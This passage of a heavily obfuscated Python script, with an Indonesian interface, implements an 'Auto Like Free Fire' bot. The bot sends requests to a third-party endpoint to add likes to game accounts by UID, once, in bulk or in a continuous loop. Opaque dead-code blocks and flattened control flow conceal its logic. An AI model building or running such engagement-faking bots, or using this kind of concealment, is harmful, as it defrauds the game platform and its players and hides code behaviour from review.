                        lIlllIIlllIIlIIIll = (lIlIlIIIIIIIlllIlIlIIIl * 2 ^ 11869495) & 16777215
                        IllIIIllIIIIlIllII = 5271560
                        continue
                    if IllIIIllIIIIlIllII == 2352883:
                        IIIIIIIIIllllI = sum(IlIllIllIlIlIllIIIllllI) + lIlllIIlllIIlIIIll % 48 - lIlIlIIIIIIIlllIlIlIIIl
                        break
                    if IllIIIllIIIIlIllII == 5271560:
                        IlIllIllIlIlIllIIIllllI = [lIlllIIlllIIlIIIll >> 4 & 255 for lllIlIllIIlIIlIlI in range(2)]
                        IllIIIllIIIIlIllII = 2352883
                        continue
                    if IllIIIllIIIIlIllII == 6734195:
                        lIlIlIIIIIIIlllIlIlIIIl = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][1] * 51684 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28]
                        IllIIIllIIIIlIllII = 2996991
                        continue
                    if IllIIIllIIIIlIllII == 8576009:
                        IllIIIllIIIIlIllII = 2996991
                        continue
            llIIIIlllIIlIllIlI = 8159819
            continue
        if llIIIIlllIIlIllIlI == 6892972:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}├{'─' * IlllllIllIIIIlIlI}┤')
            llIIIIlllIIlIllIlI = 8202978
            continue
        if llIIIIlllIIlIllIlI == 6111391:
            lIIIIIIlIlIIIllIlllIIII = 0
            llIIIIlllIIlIllIlI = 2757392
            continue

def send_like_request(uid, region='id'):
    llIlIIlIIIlllllI = 1779140
    while True:
        if llIlIIlIIIlllllI == 3952299:
            url = f'https://neww-xnxx2-like.vercel.app/like?uid={uid}'
            llIlIIlIIIlllllI = 8210513
            continue
        if llIlIIlIIIlllllI == 4263184:
            llIlIIlIIIlllllI = 3952299
            continue
        if llIlIIlIIIlllllI == 1779140:
            llIlIIlIIIlllllI = 3952299
            continue
        if llIlIIlIIIlllllI == 8210513:
            try:
                lllIIIIlIlllIllIlllIIl = 4104302
                while True:
                    if lllIIIIlIlllIllIlllIIl == 4130515:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}🌍 Region     :{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{getattr(data, 'get')('Region', getattr(region, 'upper')())}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                        lllIIIIlIlllIllIlllIIl = 5202561
                        continue
                    if lllIIIIlIlllIllIlllIIl == 3381888:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}➕ Like Diberikan:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}+{getattr(data, 'get')('like_yang_diberikan', 0)}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                        lllIIIIlIlllIllIlllIIl = 6913851
                        continue
                    if lllIIIIlIlllIllIlllIIl == 8445338:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}🆔 UID        :{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{getattr(data, 'get')('UID', uid)}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                        lllIIIIlIlllIllIlllIIl = 4130515
                        continue
                    if lllIIIIlIlllIllIlllIIl == 7922575:
                        data = getattr(response, 'json')()
                        lllIIIIlIlllIllIlllIIl = 3143718
                        continue
                    if lllIIIIlIlllIllIlllIIl == 2992430:
                        if getattr(response, 'status_code') != 200:
                            return {'status': 'error', 'message': f'HTTP {getattr(response, 'status_code')}'}
                        lllIIIIlIlllIllIlllIIl = 7922575
                        continue
                    if lllIIIIlIlllIllIlllIIl == 6051657:
                        lllIIIIlIlllIllIlllIIl = 6051657
                        continue
                    if lllIIIIlIlllIllIlllIIl == 4973082:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}╢')
                        lllIIIIlIlllIllIlllIIl = 3649199
                        continue
                    if lllIIIIlIlllIllIlllIIl == 3143718:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
                        lllIIIIlIlllIllIlllIIl = 3450723
                        continue
                    if lllIIIIlIlllIllIlllIIl == 6913851:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}📈 Like Sesudah:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{getattr(data, 'get')('like_sesudah', 0)}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                        lllIIIIlIlllIllIlllIIl = 6399276
                        continue
                    if lllIIIIlIlllIllIlllIIl == 3450723:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}📊 LIKE RESULT{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                        lllIIIIlIlllIllIlllIIl = 4973082
                        continue
                    if lllIIIIlIlllIllIlllIIl == 6399276:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
                        lllIIIIlIlllIllIlllIIl = 8234401
                        continue
                    if lllIIIIlIlllIllIlllIIl == 4104302:
                        response = getattr(requests, 'get')(url)
                        lllIIIIlIlllIllIlllIIl = 2992430
                        continue
                    if lllIIIIlIlllIllIlllIIl == 5202561:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}📊 Like Sebelum:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{getattr(data, 'get')('like_sebelum', 0)}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                        lllIIIIlIlllIllIlllIIl = 3381888
                        continue
                    if lllIIIIlIlllIllIlllIIl == 8234401:
                        if getattr(data, 'get')('status') == 1:
                            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}✅ BERHASIL! +{getattr(data, 'get')('LikesGivenByAPI', 0)} like terkirim!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                            return {'status': 'success', 'data': data}
                        else:
                            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'RED1')}⚠️ GAGAL: {getattr(data, 'get')('message', 'Unknown error')}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                            return {'status': 'failed', 'message': getattr(data, 'get')('message')}
                        break
                    if lllIIIIlIlllIllIlllIIl == 3649199:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}👤 Nama Pemain :{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{getattr(data, 'get')('nama_pemain', 'N/A')}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                        lllIIIIlIlllIllIlllIIl = 8445338
                        continue
                    if lllIIIIlIlllIllIlllIIl == 3990045:
                        lllIIIIlIlllIllIlllIIl = 3381888
                        continue
            except getattr(getattr(requests, 'exceptions'), 'RequestException') as e:
                print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ Error Koneksi: {e}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                return {'status': 'error', 'message': str(e)}
            except getattr(json, 'JSONDecodeError'):
                print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ Respons bukan JSON yang valid{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                return {'status': 'error', 'message': 'Invalid JSON response'}
            break

def send_single_like(uid, region='id', delay=3):
    lIIIIIlIlIIllII = 5278445
    while True:
        if lIIIIIlIlIIllII == 7266564:
            return lIllIllIlIllIlIIIIlIIlll
            break
        if lIIIIIlIlIIllII == 2479372:
            lIIIIIlIlIIllII = 5278445
            continue
        if lIIIIIlIlIIllII == 5278445:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][10] * 83 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][11] == 9241:
                lIIlIllIIIIIIlIIIlIll = 6283520
                while True:
                    if lIIlIllIIIIIIlIIIlIll == 2365731:
                        lIIlIllIIIIIIlIIIlIll = 7345483
                        continue
                    if lIIlIllIIIIIIlIIIlIll == 7345483:
                        lIIlIllIIIIIIlIIIlIll = 6283520
                        continue
                    if lIIlIllIIIIIIlIIIlIll == 5112561:
                        llIlIlIIIIIlIIlIlIIIIIll = [llIIllIllIlIllIIIIllIIlI >> 8 & 255 for IlIllllIIllIIIlIIIlllIIl in range(7)]
                        lIIlIllIIIIIIlIIIlIll = 8541164
                        continue
                    if lIIlIllIIIIIIlIIIlIll == 9732810:
                        llIIllIllIlIllIIIIllIIlI = (llIIllIIIIIIIIlI * 7 ^ 1758711) & 4294967295
                        lIIlIllIIIIIIlIIIlIll = 5112561
                        continue
                    if lIIlIllIIIIIIlIIIlIll == 8541164:
                        lIllIIllIlIIIlIIIllIlllI = sum(llIlIlIIIIIlIIlIlIIIIIll) + llIIllIllIlIllIIIIllIIlI % 3 - llIIllIIIIIIIIlI
                        break
                    if lIIlIllIIIIIIlIIIlIll == 6283520:
                        llIIllIIIIIIIIlI = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][27] * 38508 + 192
                        lIIlIllIIIIIIlIIIlIll = 9732810
                        continue
            lIIIIIlIlIIllII = 1752109
            continue
        if lIIIIIlIlIIllII == 3079017:
            getattr(IlllllIIllIIllIIll, 'sleep')(delay)
            lIIIIIlIlIIllII = 7266564
            continue
        if lIIIIIlIlIIllII == 7655714:
            lIIIIIlIlIIllII = 7655714
            continue
        if lIIIIIlIlIIllII == 4113198:
            lIIIIIlIlIIllII = 8551834
            continue
        if lIIIIIlIlIIllII == 1752109:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}🚀 Memproses UID: {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{uid}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            lIIIIIlIlIIllII = 8551834
            continue
        if lIIIIIlIlIIllII == 8551834:
            lIllIllIlIllIlIIIIlIIlll = send_like_request(uid, region)
            lIIIIIlIlIIllII = 3079017
            continue

def send_bulk_likes(uid_list, region='id', delay=3):
    IllIIlIIIIllllI = 6030807
    while True:
        if IllIIlIIIIllllI == 5904063:
            IllIIlIIIIllllI = 3051350
            continue
        if IllIIlIIIIllllI == 6030807:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][6] ^ 4 == 517:
                llllllllIIllIIlIIl = 6560939
                while True:
                    if llllllllIIllIIlIIl == 9267438:
                        llllllllIIllIIlIIl = 8269273
                        continue
                    if llllllllIIllIIlIIl == 5317390:
                        IIllIIIIIlIIIllIIIIlIl = (llIlIlIlIlIIlIIIIlIIII * 4 ^ 341489) & 16777215
                        llllllllIIllIIlIIl = 2123077
                        continue
                    if llllllllIIllIIlIIl == 2123077:
                        IIllllIlIIIIIIllIl = [IIllIIIIIlIIIllIIIIlIl >> 12 & 255 for lllIIIlIIllIllllIIl in range(4)]
                        llllllllIIllIIlIIl = 8269273
                        continue
                    if llllllllIIllIIlIIl == 8269273:
                        lIllIlllIllIlIIIll = sum(IIllllIlIIIIIIllIl) + IIllIIIIIlIIIllIIIIlIl % 27 - llIlIlIlIlIIlIIIIlIIII
                        break
                    if llllllllIIllIIlIIl == 6560939:
                        llIlIlIlIlIIlIIIIlIIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15] * 452115 + 140
                        llllllllIIllIIlIIl = 5317390
                        continue
                    if llllllllIIllIIlIIl == 5532238:
                        llllllllIIllIIlIIl = 4325914
                        continue
                    if llllllllIIllIIlIIl == 4325914:
                        llllllllIIllIIlIIl = 9267438
                        continue
            IllIIlIIIIllllI = 4100561
            continue
        if IllIIlIIIIllllI == 3051350:
            return IlIllIlIIIIIIIIIlllIlIlI
            break
        if IllIIlIIIIllllI == 8649068:
            IllIIlIIIIllllI = 4100561
            continue
        if IllIIlIIIIllllI == 5572367:
            IllIIlIIIIllllI = 5572367
            continue
        if IllIIlIIIIllllI == 4100561:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}🔥 Memproses {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{len(uid_list)}{getattr(IlIIIIIIlIIlIlll, 'RST')} UID...')
            IllIIlIIIIllllI = 9668271
            continue
        if IllIIlIIIIllllI == 5615888:
            for uid in uid_list:
                IllIllIllIlIIlIllIlIlll = 8918388
                while True:
                    if IllIllIllIlIIlIllIlIlll == 7362589:
                        getattr(IlllllIIllIIllIIll, 'sleep')(delay)
                        break
                    if IllIllIllIlIIlIllIlIlll == 4057033:
                        IllIllIllIlIIlIllIlIlll = 4073940
                        continue
                    if IllIllIllIlIIlIllIlIlll == 8918388:
                        print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}--- UID: {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{uid}{getattr(IlIIIIIIlIIlIlll, 'RST')} ---')
                        IllIllIllIlIIlIllIlIlll = 9889540
                        continue
                    if IllIllIllIlIIlIllIlIlll == 9889540:
                        IlllllllllIlIlIlIlIIl = send_like_request(uid, region)
                        IllIllIllIlIIlIllIlIlll = 4073940
                        continue
                    if IllIllIllIlIIlIllIlIlll == 4073940:
                        getattr(IlIllIlIIIIIIIIIlllIlIlI, 'append')(IlllllllllIlIlIlIlIIl)
                        IllIllIllIlIIlIllIlIlll = 7362589
                        continue
            IllIIlIIIIllllI = 1954977
            continue
        if IllIIlIIIIllllI == 1954977:
            lllllIIIIIlIlIIIl = sum((1 for r in IlIllIlIIIIIIIIIlllIlIlI if getattr(r, 'get')('status') == 'success'))
            IllIIlIIIIllllI = 9849164
            continue
        if IllIIlIIIIllllI == 9849164:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}📊 RINGKASAN: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{lllllIIIIIlIlIIIl}/{len(uid_list)}{getattr(IlIIIIIIlIIlIlll, 'RST')} berhasil!')
            IllIIlIIIIllllI = 3051350
            continue
        if IllIIlIIIIllllI == 9668271:
            IlIllIlIIIIIIIIIlllIlIlI = []
            IllIIlIIIIllllI = 5615888
            continue

def like_loop(uid, region='id', interval=60, max_loop=None):
    llllllIIllllIlll = 3474236
    while True:
        if llllllIIllllIlll == 3241628:
            llIIllIlIIIlllIIll = 0
            llllllIIllllIlll = 8800588
            continue
        if llllllIIllllIlll == 7083812:
            llllllIIllllIlll = 7083812
            continue
        if llllllIIllllIlll == 8800588:
            while True:
                llIIllIlIIIlllIIll += 1
                print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}🔄 LOOP KE-{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{llIIllIlIIIlllIIll}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                lIlIlIllIlllIlIIIIl = send_like_request(uid, region)
                if max_loop and llIIllIlIIIlllIIll >= max_loop:
                    print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}✅ Selesai {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{max_loop}{getattr(IlIIIIIIlIIlIlll, 'RST')} kali looping!')
                    break
                print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⏳ Menunggu {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{interval}{getattr(IlIIIIIIlIIlIlll, 'RST')} detik sebelum loop berikutnya...')
                getattr(IlllllIIllIIllIIll, 'sleep')(interval)
            break
        if llllllIIllllIlll == 5100846:
            llllllIIllllIlll = 3474236
            continue
        if llllllIIllllIlll == 3474236:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][10] ^ 115 == 308:
                IIIIlIlIlIIlIIIll = 7779788
                while True:
                    if IIIIlIlIlIIlIIIll == 1322364:
                        IlIlllllIIlIllIIllIIlIII = [IIIlIIllllllIl >> 10 & 255 for lIIlllllIlllllIIIIIIllI in range(7)]
                        IIIIlIlIlIIlIIIll = 4108024
                        continue
                    if IIIIlIlIlIIlIIIll == 7779788:
                        IIllIlllIllIIlIIl = 180748
                        IIIIlIlIlIIlIIIll = 5507396
                        continue
                    if IIIIlIlIlIIlIIIll == 4108024:
                        IIlIIIlllIIllIll = sum(IlIlllllIIlIllIIllIIlIII) + IIIlIIllllllIl % 60 - IIllIlllIllIIlIIl
                        break
                    if IIIIlIlIlIIlIIIll == 7298632:
                        IIIIlIlIlIIlIIIll = 4108024
                        continue
                    if IIIIlIlIlIIlIIIll == 5507396:
                        IIIlIIllllllIl = (IIllIlllIllIIlIIl * 7 ^ 8454123) & 4294967295
                        IIIIlIlIlIIlIIIll = 1322364
                        continue
            llllllIIllllIlll = 3241628
            continue

def show_like_menu():
    while True:
        load_license()
        get_runtime_config()
        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ AUTO LIKE FREE FIRE ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}1{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Like 1 UID (Sekali){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}2{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Like Banyak UID (Sekali){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}3{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Like Loop (Terus Menerus){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}0{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Kembali ke Menu Utama{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
        try:
            IIlIlllIlIllllllIIIl = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Pilih menu [0-3]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
            print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
            if IIlIlllIlIllllllIIIl == '1':
                validate_uid_input()
            elif IIlIlllIlIllllllIIIl == '2':
                collect_uid_list()
            elif IIlIlllIlIllllllIIIl == '3':
                show_loop_warning()
            elif IIlIlllIlIllllllIIIl == '0':
                break
            else:
                print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ Pilihan tidak valid!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                getattr(IlllllIIllIIllIIll, 'sleep')(1)
        except KeyboardInterrupt:
            IlIIlIlIlIIIIllIllIIll()
        except Exception as e:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ Error: {e}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            input('Press Enter to continue...')

def validate_uid_input():
    IIIIIIllllIllllII = 5989505
    while True:
        if IIIIIIllllIllllII == 3204592:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IIIIIIllllIllllII = 2019726
            continue
        if IIIIIIllllIllllII == 8622596:
            load_license()
            IIIIIIllllIllllII = 2865449
            continue
        if IIIIIIllllIllllII == 3583415:
            region = select_region()
            IIIIIIllllIllllII = 3204592
            continue
        if IIIIIIllllIllllII == 2865449:
            get_runtime_config()
            IIIIIIllllIllllII = 4801700
            continue
        if IIIIIIllllIllllII == 4801700:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IIIIIIllllIllllII = 7876335
            continue
        if IIIIIIllllIllllII == 1426514:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            IIIIIIllllIllllII = 8377284
            continue
        if IIIIIIllllIllllII == 7876335:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}🎯 LIKE 1 UID (SEKALI){getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IIIIIIllllIllllII = 1426514
            continue
        if IIIIIIllllIllllII == 2019726:
            send_single_like(uid, region)
            IIIIIIllllIllllII = 8958808
            continue
        if IIIIIIllllIllllII == 3449004:
            IIIIIIllllIllllII = 5989505
            continue
        if IIIIIIllllIllllII == 7197004:
            while True:
                uid = getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Masukkan UID: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                if getattr(uid, 'isdigit')() and len(uid) >= 8:
                    break
                print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ UID harus berupa angka minimal 8 digit!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            IIIIIIllllIllllII = 3583415
            continue
        if IIIIIIllllIllllII == 8377284:
            print()
            IIIIIIllllIllllII = 7197004
            continue
        if IIIIIIllllIllllII == 8958808:
            input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter untuk kembali...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            break
        if IIIIIIllllIllllII == 5989505:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][19] * 67 + 69 == 7453:
                IIIlIIllIlIIIlIIlIl = 7542345
                while True:
                    if IIIlIIllIlIIIlIIlIl == 7542345:
                        IIIIlllIlIIllll = 78694500 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][4]
                        IIIlIIllIlIIIlIIlIl = 7470060
                        continue
                    if IIIlIIllIlIIIlIIlIl == 7470060:
                        IlIIIIllIIlllIlllIlII = (IIIIlllIlIIllll * 7 ^ 2611678) & 4294967295
                        IIIlIIllIlIIIlIIlIl = 3229440
                        continue
                    if IIIlIIllIlIIIlIIlIl == 5882827:
                        IIIlIlIIIlIllIIl = sum(IlIlIlllIllIlIIlIlllIllI) + IlIIIIllIIlllIlllIlII % 14 - IIIIlllIlIIllll
                        break
                    if IIIlIIllIlIIIlIIlIl == 7609110:
                        IIIlIIllIlIIIlIIlIl = 3229440
                        continue
                    if IIIlIIllIlIIIlIIlIl == 4401054:
                        IIIlIIllIlIIIlIIlIl = 4401054
                        continue
                    if IIIlIIllIlIIIlIIlIl == 3229440:
                        IlIlIlllIllIlIIlIlllIllI = [IlIIIIllIIlllIlllIlII >> 8 & 255 for llIIlIIlllIIIl in range(7)]
                        IIIlIIllIlIIIlIIlIl = 5882827
                        continue
            IIIIIIllllIllllII = 8622596
            continue

def collect_uid_list():
    lIllllIllllIIlllIl = 1570942
    while True:
        if lIllllIllllIIlllIl == 1570942:
            lIllllIllllIIlllIl = 7536912
            continue
        if lIllllIllllIIlllIl == 4155677:
            lIllllIllllIIlllIl = 9150322
            continue
        if lIllllIllllIIlllIl == 6605129:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}📋 LIKE BANYAK UID (SEKALI){getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lIllllIllllIIlllIl = 7161489
            continue
        if lIllllIllllIIlllIl == 9150322:
            get_runtime_config()
            lIllllIllllIIlllIl = 1625567
            continue
        if lIllllIllllIIlllIl == 6123429:
            send_bulk_likes(IlIIIIllIllIllI, region, llllIIlIIIIlllIIIlI)
            lIllllIllllIIlllIl = 4362753
            continue
        if lIllllIllllIIlllIl == 8044386:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            lIllllIllllIIlllIl = 1674133
            continue
        if lIllllIllllIIlllIl == 4362753:
            input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter untuk kembali...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            break
        if lIllllIllllIIlllIl == 5826053:
            if not IlIIIIllIllIllI:
                lllIIlIIIIIIllIlIIlIlIlI = 6342719
                while True:
                    if lllIIlIIIIIIllIlIIlIlIlI == 6342719:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⚠️ Tidak ada UID yang dimasukkan!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        lllIIlIIIIIIllIlIIlIlIlI = 9095227
                        continue
                    if lllIIlIIIIIIllIlIIlIlIlI == 9170694:
                        lllIIlIIIIIIllIlIIlIlIlI = 9170694
                        continue
